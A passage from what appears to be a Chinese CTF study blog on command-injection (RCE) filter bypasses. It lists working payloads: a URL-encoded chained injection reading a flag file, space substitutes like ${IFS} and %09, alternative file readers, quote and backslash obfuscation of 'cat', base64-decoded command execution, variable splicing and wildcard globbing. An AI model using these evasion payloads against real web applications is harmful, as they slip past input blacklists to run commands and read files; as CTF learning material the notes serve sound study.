class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd%09..%26%26cd%09..%26%26cd%09..%26%26ls%26%26ca$@t%09ffff$@llllaaaaggggg</span><br></pre></td></tr></table></figure><h4 id="空格代替">空格代替</h4><p>命令执行中空格被过滤。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;IFS&#125;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">IFS<span class="variable">$9</span></span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">09</span></span><br></pre></td></tr></table></figure><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/rce1_1_1.png" alt></p><blockquote><p><code>$IFS</code>在linux下表示分隔符，只有<code>cat$IFSa.txt</code>的时候，bash解析器会把整个IFSa当作变量名，所以导致没有办法运行，然而如果加上{}就固定了变量名，同理在后面加个$可以起到截断的作用。</p><p><code>$9</code>指的是当前系统shell进程的第九个参数的持有者，若没有9个参数，则为空，因此$9相当于没有加东西，等于做了一个前后隔离。</p></blockquote><p>不仅仅局限于<code>$9</code>，$加一个一位数字均可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">echo &quot;参数1：&quot; $1</span><br><span class="line">echo &quot;参数2：&quot; $2</span><br><span class="line">echo &quot;参数3：&quot; $3</span><br><span class="line">echo &quot;参数4：&quot; $4</span><br><span class="line">echo &quot;参数5：&quot; $5</span><br><span class="line">echo &quot;参数6：&quot; $6</span><br><span class="line">echo &quot;参数7：&quot; $7</span><br><span class="line">echo &quot;参数8：&quot; $8</span><br><span class="line">echo &quot;参数9：&quot; $9</span><br><span class="line">echo &quot;参数10：&quot; $10</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">测试  ./test.sh a b c d c d e f g h</span> </span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/rce1_1_2.png" alt></p><blockquote><p><code>$8、$9</code>因为没有传递参数，返回的结果为空。</p><p><code>$10</code>被解析成了<code>$1</code>和0，所以结果会是<code>a0</code>，若想获取第10个变量使用<code>$&#123;10&#125;</code>。</p></blockquote><h4 id="读取内容">读取内容</h4><p>列出目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tee #ls -l| tee 1.txt</span><br></pre></td></tr></table></figure><blockquote><p>tee命令通常的用法是将一个命令的输出保存到文件中，同时在终端上显示输出内容。</p></blockquote><p>读取文件</p><p><code>cat</code>被禁用，使用下列命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat   # 由第一行开始显示内容，并将所有内容输出</span><br><span class="line">tac   # 从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">more  # 根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less  # 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head  # 只显示头几行</span><br><span class="line">tail  # 只显示最后几行</span><br><span class="line">nl    # 类似于cat -n，显示时输出行号</span><br><span class="line">tailf # 类似于tail -f</span><br><span class="line">sort # 读文件</span><br></pre></td></tr></table></figure><h4 id="加特殊字符绕过">加特殊字符绕过</h4><p><code>cat</code>被禁用。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ca\t fl\ag.txt</span><br><span class="line"><span class="meta prompt_">ca$</span><span class="language-bash">@t fl<span class="variable">$@ag</span>.txt</span></span><br><span class="line">c&#x27;a&#x27;t flag.txt</span><br><span class="line">c&quot;a&quot;t flag.txt</span><br></pre></td></tr></table></figure><h4 id="编码绕过">编码绕过</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`echo &#x27;Y2F0Cg==&#x27; | base64 -d`  flag.txt #cat </span><br></pre></td></tr></table></figure><h4 id="拼接绕过">拼接绕过</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=f;d=lag;e=.txt;$a$b $c$d$e</span><br></pre></td></tr></table></figure><h4 id="通配符绕过">通配符绕过</h4><blockquote><p>[…]表示匹配方括号之中的任意一个字符</p><p>{…}表示匹配大括号里面的所有模式</p><p>上述二则的区别，当匹配的文件不存在时，[…]会失去模式的功能，变成一个单纯的字符串，而{…}依然可以展开。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat f?ag.txt</span><br><span class="line">cat fl*</span><br><span class="line">cat f[a-z]ag.txt</span><br><span class="line">cat fl&#123;a,b,c,d,e&#125;g.txt</span><br></pre></td></tr></table></figure><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/rce1_1_3.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> 二分法 </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
